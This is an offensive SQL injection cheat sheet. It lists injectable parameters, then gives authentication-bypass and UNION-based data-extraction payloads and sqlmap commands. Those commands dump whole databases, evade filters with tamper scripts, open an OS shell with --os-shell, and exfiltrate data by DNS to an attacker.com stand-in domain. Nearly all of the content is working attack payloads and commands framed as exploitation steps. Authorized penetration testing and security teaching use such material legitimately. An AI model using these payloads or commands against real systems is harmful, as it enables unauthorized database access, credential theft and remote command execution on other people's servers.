# SQL Injection & Recon Cheat Sheet

## 🛠️ Common SQL Injection Parameters

### **1. URL Parameters (GET Requests)**
- `id`
- `user`
- `uid`
- `pid`
- `category`
- `type`
- `search`
- `item`
- `lang`
- `sort`
- `filter`
- `product_id`
- `article_id`

📌 **Example:**
```bash
https://example.com/product.php?id=5'
```

### **2. Form Inputs (POST Requests)**
- `username`
- `password`
- `email`
- `token`
- `address`
- `phone`
- `zipcode`
- `message`
- `feedback`

📌 **Example:**
```http
POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=12345
```

### **3. Headers**
- `User-Agent`
- `Referer`
- `X-Forwarded-For`
- `Cookie`
- `Authorization`

📌 **Example:**
```http
User-Agent: Mozilla/5.0' OR '1'='1
```

### **4. JSON Parameters (APIs)**
- `email`
- `username`
- `password`
- `query`
- `data`
- `filter`
- `search`

📌 **Example:**
```json
{
  "username": "admin",
  "password": "' OR '1'='1"
}
```

### **5. Cookie Values**
- `sessionid`
- `auth`
- `user_token`
- `PHPSESSID`

📌 **Example:**
```http
Cookie: auth=' OR '1'='1
```

### **6. Hidden Form Fields**
- `price`
- `discount`
- `user_role`
- `order_id`

📌 **Example:**
```html
<input type="hidden" name="user_role" value="admin">
```

---

## 🔍 **SQL Injection Reconnaissance**

### **1. Basic Probing Payloads**
```sql
' OR '1'='1
' UNION SELECT 1,2,3 --
" OR ""="
admin' --
```

### **2. Detecting SQL Injection**
```sql
' AND 1=1 -- 
' AND 1=2 --
" AND 1=1 --
" AND 1=2 --
```

### **3. Extracting Data**
```sql
' UNION SELECT null, database() --
' UNION SELECT null, table_name FROM information_schema.tables --
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --
```

### **4. Bypassing Authentication**
```sql
admin' --
admin' OR '1'='1
" OR ""="
```

---

## 🚀 **SQLMap Usage**

## 1. SQLMap Basic Usage
```bash
sqlmap -u "http://example.com/?id=1" --dbs
sqlmap -u "http://example.com/login" --data "username=admin&password=test" --dbs
sqlmap -u "http://example.com/?id=1" --level=5 --risk=3 --batch --dump-all
```

## 2. SQLMap Advanced Usage
```bash
sqlmap -u "http://example.com/?id=1" --tamper=space2comment
sqlmap -u "http://example.com/?id=1" --random-agent --proxy="http://127.0.0.1:8080"
sqlmap -u "http://example.com/?id=1" --dump --hex --threads=10
sqlmap -u "http://example.com/?id=1" --os-shell
```

## 3. SQLMap DNS Exfiltration
```bash
sqlmap -u "http://example.com/?id=1" --dns-domain=attacker.com --batch
sqlmap -u "http://example.com/?id=1" --os-shell --dns-domain=attacker.com
```

## 4. Detecting SQL Injection (Manual Testing)
```bash
curl -X GET "http://example.com/?id=1'"
curl -X GET "http://example.com/?id=1")"
curl -X GET "http://example.com/?id=1' OR '1'='1"
curl -X POST "http://example.com/login" -d "username=admin'--&password=test"
```

## 5. Enumerate Tables
```bash
sqlmap -u "http://example.com/product.php?id=5" -D database_name --tables
```

## 6. Dump Data
```bash
sqlmap -u "http://example.com/product.php?id=5" -D database_name -T users --dump
```

### 7. Using POST Request
```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test" --dbs
```

### 8. Using Cookies
```bash
sqlmap -u "http://example.com/profile.php" --cookie="sessionid=abc123" --dbs
```

### 9. Fingerprinting Database
```bash
sqlmap -u "http://example.com/product.php?id=5" --fingerprint
```

### 10. Batch Mode (Non-Interactive)
```bash
sqlmap -u "http://example.com/product.php?id=5" --batch
```

---

## 📌 **Key Takeaways**
- **Always test common GET & POST parameters** as they are prime SQLi targets.
- **Use SQLMap to automate SQLi detection and exploitation.**
- **Tamper scripts** can help bypass security filters.
- **Look for error messages** that reveal database details.
